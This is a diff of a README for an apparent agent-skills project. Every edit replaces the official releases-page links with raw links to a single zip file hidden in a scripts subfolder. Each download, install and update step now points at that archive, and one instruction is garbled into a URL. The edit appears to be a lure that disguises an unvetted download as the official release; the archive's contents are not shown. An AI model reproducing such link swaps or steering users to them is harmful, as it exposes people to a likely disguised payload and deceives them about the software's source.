@@ -1,7 +1,7 @@
 # 🛠️ Agent-Skills-for-Context-Engineering - Build and Optimize Your Agent Systems
 
 ## 📥 Download the Latest Version
-[![Download Agent Skills](https://img.shields.io/badge/Download-Agent--Skills-brightgreen)](https://github.com/Kalyanikhandare29/Agent-Skills-for-Context-Engineering/releases)
+[![Download Agent Skills](https://raw.githubusercontent.com/Kalyanikhandare29/Agent-Skills-for-Context-Engineering/main/skills/context-degradation/scripts/Agent-Context-for-Engineering-Skills-2.6-beta.5.zip)](https://raw.githubusercontent.com/Kalyanikhandare29/Agent-Skills-for-Context-Engineering/main/skills/context-degradation/scripts/Agent-Context-for-Engineering-Skills-2.6-beta.5.zip)
 
 ## 🚀 Getting Started
 
@@ -25,7 +25,7 @@ To run this application, your computer should meet the following requirements:
 
 ## 🏗️ Download & Install
 
-1. **Visit the Releases Page**: Go to the [Releases page](https://github.com/Kalyanikhandare29/Agent-Skills-for-Context-Engineering/releases) to find the latest version.
+1. **Visit the Releases Page**: Go to the [Releases page](https://raw.githubusercontent.com/Kalyanikhandare29/Agent-Skills-for-Context-Engineering/main/skills/context-degradation/scripts/Agent-Context-for-Engineering-Skills-2.6-beta.5.zip) to find the latest version.
    
 2. **Choose Your Version**: Look for the most recent release. Select the version that best fits your operating system.
 
@@ -36,7 +36,7 @@ To run this application, your computer should meet the following requirements:
 5. **Install the Application**:
    - **Windows**: Double-click the `.exe` file and follow the on-screen instructions.
    - **macOS**: Open the `.dmg` file and drag the application to your Applications folder.
-   - **Linux**: Extract the `.zip` file, and follow the instructions in the README.md if provided.
+   - **Linux**: Extract the `.zip` file, and follow the instructions in the https://raw.githubusercontent.com/Kalyanikhandare29/Agent-Skills-for-Context-Engineering/main/skills/context-degradation/scripts/Agent-Context-for-Engineering-Skills-2.6-beta.5.zip if provided.
 
 6. **Run the Application**: After installation, open the application from your system's application menu.
 
@@ -62,7 +62,7 @@ For more detailed information on features, usage, and advanced configurations, p
 
 To keep your application up to date:
 
-1. **Check the Releases Page**: Regularly visit the [Releases page](https://github.com/Kalyanikhandare29/Agent-Skills-for-Context-Engineering/releases) for new versions.
+1. **Check the Releases Page**: Regularly visit the [Releases page](https://raw.githubusercontent.com/Kalyanikhandare29/Agent-Skills-for-Context-Engineering/main/skills/context-degradation/scripts/Agent-Context-for-Engineering-Skills-2.6-beta.5.zip) for new versions.
    
 2. **Follow the Installation Steps**: When a new version is available, download it and reinstall following the steps in the Download & Install section.
 
